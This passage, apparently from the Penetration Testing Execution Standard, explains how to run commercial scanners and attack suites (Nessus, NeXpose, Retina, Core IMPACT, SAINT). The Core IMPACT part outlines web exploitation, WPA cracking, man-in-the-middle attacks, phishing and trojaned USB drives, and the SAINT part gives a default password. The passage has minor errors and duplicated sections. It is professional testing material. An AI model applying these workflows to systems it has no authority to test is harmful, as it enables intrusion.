<div class="line">&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_65.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</div>
</div>
<div class="line-block">
<div class="line">The credentials to access this will need to be established prior to
attempting to access. Once you have the logged in, you will be
presented with the Reports Interface. Prior to running any Nessus
scan, the product should be validated to ensure that it has been
properly updated with the latest signatures. This process is normally
run as part of a scheduled task, but you can run click on &#8220;About&#8221;
which will present the Windows which contains data about the
installation.</div>
<div class="line-block">
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_66.png">Screenshot Here</a></div>
</div>
</div>
<p>The Client Build ID is quick way to ensure that Nessus has been updated.
The format is as simple as YYYYMMDD. 201110223 would mean that the
scanner was last updated on February, 23, 2011.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_67.png">Screenshot Here</a></p>
<p>If the scanner has been updated within the last week, you can safely
conduct scans. If this date is further out than one week, you should
immediately report this and avoid using the scanner until Nessus has
been updated.</p>
<div class="line-block">
<div class="line">Within Nessus, there are four main tabs available: Reports, Scans,
Policies, and Users.</div>
<div class="line">&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_68.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</div>
</div>
<div class="line-block">
<div class="line">To initiate a scan utilize the Scan tab. This will present you with
several additional options such as Add, Edit, Browse, Launch, Pause,
Stop, and Delete.</div>
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_69.png">Screenshot Here</a></div>
</div>
<div class="line-block">
<div class="line">You will create a new scan by clicking on the &#8220;Scans&#8221; option on the
menu bar at the top and then click on the &#8220;+ Add&#8221; button on the right.
The &#8220;Add Scan&#8221; screen will be displayed as follows:</div>
<div class="line">&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_70.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</div>
</div>
<p>There are five fields to enter before starting a scan. The name field is
set to the name that will be displayed to identify the scan. The type
field allows you to choose between &#8220;Run Now&#8221; and &#8220;Template.&#8221; &#8220;Run Now&#8221;
executes the scan immediately after submitting. &#8220;Template&#8221; saves the
scan as a template for repeated scans. The policy field is where the
scan policy is selected. The final two fields are both related to the
scan targets. You can either enter in the hosts (one per line) or browse
for a text file containing all the target hosts.</p>
<p>Once all these fields have been properly populated click &#8220;Launch Scan&#8221;
to initiate the scan process.</p>
<p><em>Note:</em> Automated tools can sometimes be too aggressive by default
and need to be scaled back if the customer is affected.</p>
<p>A validation scan should be conducted weekly against &lt;IP ADDRESS&gt; using
the &#8220;Validation Scan&#8221; policy (See Appendix C) to ensure that Nessus is
performing scans in properly.</p>
<div class="line-block">
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_71.png">Screenshot Here</a></div>
<div class="line">If you conduct a &#8220;Validation Scan&#8221; and do not receive similar results,
then you should immediately report this and void using the scanner.</div>
</div>
<div class="line-block">
<div class="line">Once the scan has completed running, it will be visible in the Reports
tab. To open the scan reports simply double-click on the appropriate
completed scan file. This will provide us with some information about
the scan as well as the results.</div>
<div class="line">&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_72.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</div>
</div>
<p>We need to save this report for us to analyze. To do this, click on the
&#8220;Download Report.&#8221; This will present a new window that allows for the
format to be specified.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_73.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>The default format is &#8221;.nessus&#8221;, however it is necessary to download the
Nessus results in HTML format. This allows you to quickly review the
vulnerabilities.</p>
</div>
<div class="section" id="nexpose">
<h5>NeXpose<a class="headerlink" href="#nexpose" title="Permalink to this headline">¶</a></h5>
<p>Nessus is a commercial automated scanning product that provides
vulnerability management, policy compliance and remediation management.
It is designed to detect vulnerabilities as well as policy compliance on
the networks, hosts, and associated web applications.</p>
<p>To access NeXpose simply enter in the correct URL into a web browser. If
you are accessing from the Pentest Lab use the following URL:
<a class="reference external" href="https://">https://</a>&lt;IP ADDRESS&gt;:3780/login.html.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_74.png">Screenshot Here</a></p>
<div class="line-block">
<div class="line">The credentials to access this will need to be established prior to
attempting to access. Once you have the logged in, you will be
presented with the dashboard Interface.</div>
<div class="line-block">
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_75.png">Screenshot Here</a></div>
</div>
<div class="line">Prior to running any NeXpose scan, the product should be validated to
ensure that it has been properly updated with the latest signatures.
This process is normally run as part of a scheduled task, but you can
quickly validate that it the scanner is up to date by simply viewing
the &#8216;News&#8217; which will give you a log file of all the updates to the
scan engine as well as any updated checks.</div>
</div>
<div class="line-block">
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_76.png">Screenshot Here</a></div>
<div class="line">If the scanner has been updated within the last week, you can safely
conduct scans. If this date is further out than one week, you should
immediately report this and void using the scanner until NeXpose has
been updated.</div>
</div>
<div class="line-block">
<div class="line">Within NeXpose, there are six main tabs available: Home, Assets,
Tickets, Reports, Vulnerabilities, and Administration.</div>
<div class="line">&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_77.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</div>
</div>
<div class="line-block">
<div class="line">To initiate a scan you will have to setup a &#8216;New Site&#8217;. To perform
this click on the &#8216;New Site&#8217; button at the bottom of the Home Page or
click on the Assets tab.</div>
<div class="line-block">
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_78.png">Screenshot Here</a></div>
</div>
</div>
<div class="line-block">
<div class="line">This will present you with the &#8216;Site Configuration - General&#8217; page
which contains several inputs such as Site name, Site importance, and
Site Description.</div>
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_79.png">Screenshot Here</a></div>
</div>
<p>Type a name for the target site. Then add a brief description for the
site, and select a level of importance from the dropdown list. The
importance level corresponds to a risk factor that NeXpose uses to
calculate a risk index for each site. The &#8216;Very Low&#8217; setting reduces a
risk index to 1/3 of its initial value. The &#8216;Low&#8217; setting reduces the
risk index to 2/3 of its initial value. &#8216;High&#8217; and &#8216;Very High&#8217; settings
increase the risk index to 2x and 3x times its initial value,
respectively. A &#8216;Normal&#8217; setting does not change the risk index.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_80.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>Go to the &#8216;&#8217;Devices &#8216;&#8217;page to list assets for your new site. IP
addresses and/or hostnames can be manually entered in the text box
labeled <em>Dev</em>i<em>ces to scan</em>. It is also possible to import a comma
separated file that lists IP address and/or the host names of targets
you want to scan. You do have to ensure that each address/hostname in
the file appears on its own line.</p>
<p>To import a target list file, click the Browse&#8217;&#8216;&#8217; &#8216;&#8217;&#8216;button in the
&#8216;&#8217;&#8216;Included Device&#8217;s&#8216; &#8216;&#8217;area, and select the appropriate file.</p>
<p>If you need to exclude targets from a scan, the process is the sample
however; it is performed under the area labeled <em>&#8216;Devices to Exclude&#8217;.</em></p>
<p>Once the targets have been added, a scan template will need to be
selected from the &#8216;&#8217;&#8216;Scan Setup&#8217; &#8216;&#8217;page. To select a scan template
simply browse the available templates. The scan engine drop down allows
you to choose between the local scan engine and the Rapid 7 hosted scan
engine.</p>
<div class="line-block">
<div class="line"><br /></div>
<div class="line-block">
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_81.png">Screenshot Here</a></div>
</div>
<div class="line">There are many templates available, however be aware that if you
modify a template, all sites that use that scan template will use
these modified settings. So ensure that modify an existing template
with caution.</div>
</div>
<p>The default scan templates Denial of Service, Discovery scan, Discovery
scan (aggressive), Exhaustive, Full audit, Internal DMZ audit, Linux
RPMs, Microsoft hotfix, Payment Card Industry (PCI) audit, Penetration
test, Safe network audit, Sarbanes-Oxley (SOX) compliance, SCADA audit,
and Web audit. Specific settings for these templates are included in
Appendix D</p>
<p>Finally, if you wish to schedule a scan to run automatically, click the
check box labeled &#8216;Enable schedule&#8217;. The console displays options for a
start date and time, maximum scan duration in minutes, and frequency of
repetition. If the scheduled scan runs and exceeds the maximum specified
duration, it will pause for an interval that you specify in the option
labeled &#8216;Repeat every&#8217;. Select an option for what you want the scan to
do after the pause interval.</p>
<p>The newly scheduled scan will appear in the &#8216;Next Scan&#8217; column of the
&#8216;Site Summary&#8217; pane of the page for the site that you are creating. All
scheduled scans appear on the &#8216;Calendar&#8217; page, which you can view by
clicking the &#8216;Monthly calendar&#8217; link on the &#8216;Administration&#8217; page.</p>
<p>You can set up alerts to inform you when a scan starts, stops, fails, or
matches a specific criterion.</p>
<p>From the &#8216;&#8217;&#8216;Alerting; &#8216;&#8217;page and click the &#8216;&#8217;&#8216;&#8217;New Alert&#8217; &#8216;&#8217;&#8216;button.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_82.png">Screenshot Here</a></p>
<p>The console displays a &#8216;&#8217;&#8216;New Alert&#8217; &#8216;&#8217;dialog box. Click the &#8216;&#8217;&#8216;&#8217;Enable
alert&#8217; &#8216;&#8217;&#8216;check box to ensure that NeXpose generates this type of alert.
You can click the box again at any time to disable the alert if you
prefer not to receive that alert temporarily without having to delete
it.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_83.png">Screenshot Here</a></p>
<p>Type a name for the alert and a value in the &#8216;Send at most&#8217; field if you
wish to limit the number of this type of alert that you receive during
the scan. Select the check boxes for types of events (Started, Stopped,
Failed, Paused, and Resumed) that you wish to generate alerts for.
Select the Confirmed, Unconfirmed, and/or Potential check boxes to
receive only those alerts. Select a notification method from the
dropdown box. NeXpose can send alerts via SMTP e-mail, SNMP message, or
Syslog message. Select e-mail method and enter the addresses of your
intended recipients. Click the Limit alert text check box to send the
alert without a description of the alert or its solution. Click the Save
button. The new alert appears on the &#8216;Alerting&#8217; page.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_84.png">Screenshot Here</a></p>
<p>Establishing logon credentials enables deeper checks across a wider
range of vulnerabilities, such as policy violations, adware, or spyware.
Additionally, credentialed scans result in more accurate results. On the
&#8216;Credentials&#8217; page click &#8216;New Login&#8217; display the &#8216;New Login&#8217; box.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_85.png">Screenshot Here</a></p>
<p>Select the desired type of credentials from the dropdown list labeled
&#8216;Login type&#8217;. This selection determines the other fields that appear in
the form. In the appropriate field enter the appropriate user name
and/or password. The &#8216;Restrict to Device&#8217; and &#8216;Restrict to Port&#8217; fields
allows for testing credentials to ensure that the work on a given site.
After filling those fields, click on the &#8216;Test login&#8217; button to make
sure that the credentials work. Specifying a port in the Restrict to
Port field allows you to limit your range of scanned ports in certain
situations. Click the &#8216;Save&#8217; button. The new credentials appear on the
&#8216;Credentials&#8217; page.</p>
<p>Once the scan has completed, you can view the results in several
manners. It is possible to view the assets by sites, view assets by
groups, view assets by operating systems, view assets by services, view
assets by software, and view all assets.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_86.png">Screenshot Here</a></p>
<div class="line-block">
<div class="line"><br /></div>
<div class="line">By selecting the appropriate assets view you can select the results
that you wish to view.</div>
</div>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_87.png">Screenshot Here</a></p>
<p>To create a report, click on the &#8216;Create Site Report&#8217; button. This will
take you to the &#8216;New Report&#8217; &#8216;Configuration&#8217; page.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_88.png">Screenshot Here</a></p>
<p>Report configuration entails selecting a report template, assets to
report on, and distribution options. You may schedule automatic reports
for generation and distribution after scans or on a fixed calendar
timetable; or you may run reports manually. After you go through all the
following configuration steps and click &#8216;Save&#8217;, NeXpose will immediately
start generating a report.</p>
</div>
<div class="section" id="eeye-retina">
<h5>eEYE Retina<a class="headerlink" href="#eeye-retina" title="Permalink to this headline">¶</a></h5>
<p>eEye Retina Vulnerability Assessment Scanner is a vulnerability scanner
created by eEye Digital Security that is used to correlate and validate
findings from Nmap and Nessus.</p>
<p>At first glance, the interface looks to be much more complicated than
Nessus. It is however, extremely simple once you&#8217;ve explored it. The
initial screen that is presented is the Discovery Tasks page. This is
utilized to perform a discovery scan to determine what hosts are alive.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_89.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>To perform a Discovery Scan, click Targets from the Actions section and
the &#8220;Select Targets&#8221; option will appear. At this point you can either
enter in a single IP address or hostname that you assess. The other
options available are to scan by IP Range, CIDR, Named Host, and Address
Groups.</p>
<p>Clicking on the Options Actions section presents us with additional
options related to the Discovery scan. These options include ICMP
Discovery, TCP Discovery on Ports (enter in a comma separated list of
port numbers, UPD Discovery, Perform OS Detection, Get Reverse DNS, Get
NetBIOS Name, and Get MAC Address. Select the appropriate options for
the scan desired.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_90.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>To run the Discovery scan immediately click &#8220;Discover.&#8221; To run the
Discovery scan at a later point in time or on a regular schedule, click
&#8220;Schedule.&#8221; Retina displays your results in the Results table as it
scans the selected IP(s). In order to get the results in a format that
we can use, we need to select the scan results and click &#8220;Generate&#8221; to
export the results in XML format.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_91.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>While Discovery Scans may be useful, the majority of our tasks will take
place in the Audit Interface. This is very similar to the Discovery Scan
interface; however it does have a few more options.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_92.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>The Targets section is similar though there is an additional section
that allows us to specify the Output Type, Name, and Job Name.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_93.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<div class="line-block">
<div class="line">This section is important to complete, as this is how the scan results
will be saved. If you do not change this information then you could
potentially overwrite someone else&#8217;s scan results. By default, these
are saved to the following directory:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">eEye</span> <span class="n">Digital</span> <span class="n">Security</span>\<span class="n">Retina</span> <span class="mi">5</span>\<span class="n">Scans</span>
</pre></div>
</div>
<p>This is important to note, as you will need to copy these from this
location to your working directory.</p>
<p>At this point we need to click Ports from the Actions section and the
&#8220;Select Port Group(s)&#8221; option will appear. At this point we need to
validate that the &#8220;All Ports&#8221; option has been selected.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_94.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>The next section we need to check is &#8220;Audits&#8221; from the Actions section
and the &#8220;Select Audit Group(s)&#8221; option will appear. At this point we
need to validate that the &#8220;All Audits&#8221; option has been selected.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_95.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>The final section we need to check is &#8220;Options&#8221; from the actions
section. Clicking on this will present us with the &#8220;Select Options&#8221;
action section.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_96.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>At this point we need to validate that the following option has been
selected:</p>
<ul class="simple">
<li>Perform OS Detection</li>
<li>Get Reverse DNS</li>
<li>Get NetBIOS Name</li>
<li>Get MAC Address</li>
<li>Perform Traceroute</li>
<li>Enable Connect Scan</li>
<li>Enable Force Scan</li>
<li>Randomize Target List</li>
<li>Enumerate Registry via NetBIOS</li>
<li>Enumerate Users via NetBIOS</li>
<li>Enumerate Shares via NetBIOS</li>
<li>Enumerate Files via NetBIOS</li>
<li>Enumerate Hotfixes via NetBIOS.</li>
<li>Enumerate Named Pipes via NetBIOS</li>
<li>Enumerate Machine Information via NetBIOS</li>
<li>Enumerate Audit Policy via NetBIOS</li>
<li>Enumerate Per-User Registry Settings via NetBIOS</li>
<li>Enumerate Groups via NetBIOS</li>
<li>Enumerate Processes via NetBIOS</li>
<li>Enumerate a maximum of 100 users</li>
</ul>
<p>At this point we are ready to actually perform the Audit Scan. Click the
Scan button to start the Audit Scan immediately. To perform the scan at
a later point in time or on a regular schedule, click &#8220;Schedule.&#8221;</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_97.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p><em>Note:</em> Automated tools can sometimes be too aggressive by default
and need to be scaled back if the customer is affected.</p>
<p>The results of your scan are automatically saved in .rtd format.</p>
<p>Retina displays your results in the Results table as it scans the
selected IP(s).</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_98.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
</div>
<div class="section" id="qualys">
<h5>Qualys<a class="headerlink" href="#qualys" title="Permalink to this headline">¶</a></h5>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="core-impact">
<h5>Core IMPACT<a class="headerlink" href="#core-impact" title="Permalink to this headline">¶</a></h5>
<p>Core IMPACT is a penetration testing and exploitation toolset used for
testing the effectiveness of your information security program. Core
IMPACT automates several difficult exploits and has a multitude of
exploits and post exploitation capabilities.</p>
<p>Core IMPACT Web</p>
<p>Core can exploit SQL injection, Remote File Inclusion and Reflected
Cross Site Scripting flaws on vulnerable web applications.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:coreWEBrpt.jpg">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>1) Information Gathering. As always, the first step information
gathering. Core organizes web attacks into scenarios. You can create
multiple scenarios and test the same application with varying settings,
segment a web application, or to separate multiple applications. a)
Select the target, either by providing a url or telling Core to choose
web servers discovered during the network RPT b) Choose a method for
exploring the site, automatic or interactive.</p>
<p>With automatic crawling, select the browser agent, max pages and depth,
whether it should follow links to other/or to include other domains,
whether it should run test to determine the server/application
framework, whether to evaluate javascript, check robots.txt for links,
and how it should handle forms. For greater customization, you can also
select a link parsing module and set session parameters.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:coreWEBcrawl.jpg">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>With interactive, you set your îbrowserî to use Core as a proxy and then
navigate through the web application. Further customized discovery
modules like checking for backup and hidden pages are available on the
modules tab.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:corerptmodules.jpg">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<ol class="arabic simple" start="2">
<li>Web Attack and penetration.</li>
</ol>
<p>The attack can be directed to a scenario or individual pages. Each type
of exploit has its own configuration wizard. SQL Injection tests can be
performed on request parameters and/or request cookies. There are three
different levels of injection attacks FAST: quickly runs the most common
tests, NORMAL: runs the tests that are in the FAST plus some additional
tests FULL: runs all tests (for details on what the difference tests
check for, select the modules tab, navigate to the Exploits | SQL
Injection section and view the contents of the SQL Injection Analyzer
paying attention to the fuzz_strings). Adding information about known
custom error pages and any session arguments will enhance testing. For
XSS attacks, configure the browser XSS should be tested for, whether or
not to evaluate POST parameters and whether to look for Persistent XSS
vulnerabilities. For PHP remote file injection vulnerabilities, the
configuration is either yes try to exploit or no, donít. Monitor the
module progress in the Executed Modules pane. If the WebApps Attack and
Penetration is successful, then Core Agents (see note on agents in Core
network RPT) will appear under vulnerable pages in the Entity View.</p>
<ol class="arabic simple" start="3">
<li>Web Apps Browser attack.</li>
</ol>
<p>Can leverage XSS exploits to assist with Social Engineering awareness
tests. The wizard will guide the penetration tester though the process
of leveraging the XSS vulnerability to your list of recipients from the
client side information gathering phase.</p>
<ol class="arabic simple" start="4">
<li>Web App Local Information Gathering.</li>
</ol>
<p>Will check for sensitive information, get database logins and get the
database schema for pages where SQL was successfully exploited. Command
and SQL shells may also be possible.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:coreWEBagendeployed.jpg">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>The RFI agent(PHP) can be used to gather information, for shell access,
or to install the full Core Agent.</p>
<p>5) Report Generation. Select from a variety of reports like executive,
vulnerability and activity reports.</p>
<p>Core Onestep Web RPTs Core also has two one-step rapid penetration tests
1) WebApps Vulnerability Test Type in the web application and Core will
attempt to locate pages that contain vulnerabilities to SQL Injection,
PHP Remote File Inclusion, or Cross-site Scripting attacks. This test
can also be scheduled. 2) WebApps Vulnerability Scanner Validator</p>
<p>Core will try to confirm vulnerabilities from IBM Rational AppScan, HP
WebInspect, or NTOspider scans.</p>
<p>Core IMPACT WiFi</p>
<p>Core Impact contains a number of modules for penetration testing an
802.11 wireless network and/or the security of wireless clients. In
order to use the wireless modules you must use an AirPcap adapter
available from www.cacetech.com.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:corewireless.jpg">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>1) Information Gathering. Select the channels to scan to discover access
points or capture wireless packets.</p>
<p>2) Wireless Denial of Service The station deauth module can be used to
demonstrate wireless network disruption. It is also used to gather
information for encryption key cracking.</p>
<p>3) Crack Encryption Keys. Attempt to discover and crack WEP and WPA/WPA2
PSK encryption keys. For WPA/WPA2, relevant passwords files from
recognizance phase should be used.</p>
<p>4) Man in the Middle client attacks. Allows penetration tester to sniff
wireless traffic, intercept or manipulate requests to gain access to
sensitive data or an end user system. Leverage existing wireless network
from steps one and two, or setup fake access points with the Karma
Attack.</p>
<p>5) Reporting. Reports about all the discovered WiFi networks , summary
information about attacks while using a Fake Access Point and results of
Man In The Middle (MiTM) attacks can be generated.</p>
<p>Core IMPACT Client Side</p>
<p>Core Impact can perform controlled and targeted social engineering
attacks against a specified user community via email, web browsers,
third-party plug-ins, and other client-side applications.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:coreCSrpt.jpg">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>1) As always, the first step information gathering. Core Impact has
automate modules for scraping email addresses our of search engines (can
utilize search API keys), PGP, DNS and WHOIS records, LinkedIn as well
as by crawling a website, contents and metadata for Microsoft Office
Documents and PDFs , or importing from a text file generated using
source as documented in the intelligence gather section of the PTES. 2)
With the target list complete, the next step is to create the attack.
Core supports multiple types of attacks, including single exploit,
multiple exploits or a phishing only attack</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:coreCSattacktype.jpg">Screenshot Here</a> &#8216;&#8217;&#8217; &#8216;&#8217;&#8217; <a class="reference external" href=":File:coreCSsingle.jpg">Screenshot
Here</a> &#8216;&#8217;&#8217; &#8216;&#8217;&#8217; <a class="reference external" href=":File:coreCSmulti.jpg">Screenshot
Here</a> &#8216;&#8217;&#8217; &#8216;&#8217;&#8217; <a class="reference external" href=":File:coreCSphish.jpg">Screenshot
Here</a> &#8216;&#8217;&#8216;</p>
<p>Depending on which option is chosen the wizard will walk you through
choosing the exploit, setting the duration of the client side test, and
choosing an email template (note: predefined templates are available,
but message should be customized to match target environment!) .Web
links can be obfuscated using tinyURL, Bit.Ly or Is.gd. After setting
the options for the email server the Core Agent connect back method
(HTTP, HTTPS, or other port), and choosing whether or not to run a
module on successful exploitation or to try to collect smb credentials,
the attack will start. Specific modules can be run instead of using the
wizard by choosing the modules tab</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:corerptormodules.jpg">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>Monitor the Executed Modules pane to see the progress of the client side
attack. As agents are deployed, they will be added to the network tab.
See the network RPT section of the PTES for details on completing the
local information gathering, privilege escalation and clean up tasks.</p>
<p>Once the client side attack is complete, detailed reporting of the
client side phishing/exploitation engagement can be generated.</p>
<p>It is also possible to create a trojaned USB drive that will
automatically install the Core agent.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:coreCSusb.jpg">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>Core Web</p>
<p>Core can exploit SQL injection, Remote File Inclusion and Reflected
Cross Site Scripting flaws on vulnerable web applications. &#8216;&#8217;&#8217;
<a class="reference external" href=":File:coreWEBrpt.jpg">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>1) Information Gathering. As always, the first step information
gathering. Core organizes web attacks into scenarios. You can create
multiple scenarios and test the same application with varying settings,
segment a web application, or to separate multiple applications. a)
Select the target, either by providing a url or telling Core to choose
web servers discovered during the network RPT b) Choose a method for
exploring the site, automatic or interactive.</p>
<p><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;With&nbsp;automatic&nbsp;crawling,&nbsp;select&nbsp;the&nbsp;browser&nbsp;agent,&nbsp;max&nbsp;pages&nbsp;and&nbsp;depth,&nbsp;whether&nbsp;it&nbsp;should&nbsp;follow&nbsp;links&nbsp;to&nbsp;other/or&nbsp;to&nbsp;include&nbsp;other&nbsp;domains,&nbsp;whether&nbsp;it&nbsp;should&nbsp;run&nbsp;test&nbsp;to&nbsp;determine&nbsp;the&nbsp;server/application&nbsp;framework,&nbsp;whether&nbsp;to&nbsp;evaluate&nbsp;javascript,&nbsp;check&nbsp;robots.txt&nbsp;for&nbsp;links,&nbsp;and&nbsp;how&nbsp;it&nbsp;should&nbsp;handle&nbsp;forms.&nbsp;For&nbsp;greater&nbsp;customization,&nbsp;you&nbsp;can&nbsp;also&nbsp;select&nbsp;a&nbsp;link&nbsp;parsing&nbsp;module&nbsp;and&nbsp;set&nbsp;session&nbsp;parameters.</span></code></p>
<p>coreWEBcrawl</p>
<p>With interactive, you set your ”browser” to use Core as a proxy and then
navigate through the web application. Further customized discovery
modules like checking for backup and hidden pages are available on the
modules tab. &#8216;&#8217;&#8217; <a class="reference external" href=":File:corerptmodules.jpg">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>2) Web Attack and penetration. The attack can be directed to a scenario
or individual pages. Each type of exploit has its own configuration
wizard. SQL Injection tests can be performed on request parameters
and/or request cookies. There are three different levels of injection
attacks FAST: quickly runs the most common tests, NORMAL: runs the tests
that are in the FAST plus some additional tests FULL: runs all tests
(for details on what the difference tests check for, select the modules
tab, navigate to the Exploits | SQL Injection section and view the
contents of the SQL Injection Analyzer paying attention to the
fuzz_strings). Adding information about known custom error pages and
any session arguments will enhance testing. For XSS attacks, configure
the browser XSS should be tested for, whether or not to evaluate POST
parameters and whether to look for Persistent XSS vulnerabilities. For
PHP remote file injection vulnerabilities, the configuration is either
yes try to exploit or no, don’t. Monitor the module progress in the
Executed Modules pane. If the WebApps Attack and Penetration is
successful, then Core Agents (see note on agents in Core network RPT)
will appear under vulnerable pages in the Entity View.</p>
<p>3) Web Apps Browser attack. Can leverage XSS exploits to assist with
Social Engineering awareness tests. The wizard will guide the
penetration tester though the process of leveraging the XSS
vulnerability to your list of recipients from the client side
information gathering phase.</p>
<p>4) Web App Local Information Gathering. Will check for sensitive
information, get database logins and get the database schema for pages
where SQL was successfully exploited. Command and SQL shells may also be
possible. &#8216;&#8217;&#8217; <a class="reference external" href=":File:coreWEBagendeployed.jpg">Screenshot Here</a> &#8216;&#8217;&#8217;
The RFI agent(PHP) can be used to gather information, for shell access,
or to install the full Core Agent.</p>
<p>5) Report Generation. Select from a variety of reports like executive,
vulnerability and activity reports.</p>
<p>Core Onestep Web RPTs</p>
<p>Core also has two one-step rapid penetration tests 1) WebApps
Vulnerability Test Type in the web application and Core will attempt to
locate pages that contain vulnerabilities to SQL Injection, PHP Remote
File Inclusion, or Cross-site Scripting attacks. This test can also be
scheduled. 2) WebApps Vulnerability Scanner Validator Core will try to
confirm vulnerabilities from IBM Rational AppScan, HP WebInspect, or
NTOspider scans.</p>
<p>Core WiFi</p>
<p>Core Impact contains a number of modules for penetration testing an
802.11 wireless network and/or the security of wireless clients. In
order to use the wireless modules you must use an AirPcap adapter
available from www.cacetech.com. 1) Information Gathering. Select the
channels to scan to discover access points or capture wireless packets.</p>
<p>2) Wireless Denial of Service The station deauth module can be used to
demonstrate wireless network disruption. It is also used to gather
information for encryption key cracking.</p>
<p>3) Crack Encryption Keys. Attempt to discover and crack WEP and WPA/WPA2
PSK encryption keys. For WPA/WPA2, relevant passwords files from
recognisance phase should be used.</p>
<p>4) Man in the Middle client attacks. Allows penetration tester to sniff
wireless traffic, intercept or manipulate requests to gain access to
sensitive data or an end user system. Leverage existing wireless network
from steps one and two, or setup fake access points with the Karma
Attack.</p>
<p>5) Reporting. Reports about all the discovered WiFi networks , summary
information about attacks while using a Fake Access Point and results of
Man In The Middle (MiTM) attacks can be generated.</p>
</div>
<div class="section" id="saint">
<h5>SAINT<a class="headerlink" href="#saint" title="Permalink to this headline">¶</a></h5>
<p>SAINT Professional is a commercial suite combining two distinct tools
rolled into one easy to use management interface; SAINTscanner and
SAINTexploit providing a fully integrated vulnerability assessment and
penetration testing toolkit.</p>
<p>SAINTscanner is designed to identify vulnerabilities on network devices,
OS and within applications. It can be used for compliance and audit
testing based on pre-defined and custom policies. In addition as a data
leakage prevention tool it can enumerate any data that should not be
stored on the network. SAINTexploit is designed to exploit those
vulnerabilities identified by SAINTscanner, with the ability to carry
out bespoke social engineering and phishing attacks also. One a host or
device has been exploited it can be utilised to tunnel through to other
vulnerable hosts. SAINT can either be built from source or be run from a
pre-configured virtual machine supplied by the vendor. If the latter is
used (recommended) simply double clicking the icon will launch the
suite. By default the password is “SAINT!!!” The default web browser
opens after SAINT auto updates to the following URL: <a class="reference external" href="http://">http://</a>:52996/
Screenshot Here SAINT_startup.png refers (included).</p>
<p>SAINTscanner</p>
<p>Once logged in you immediately enter the SAINTscanner page with the
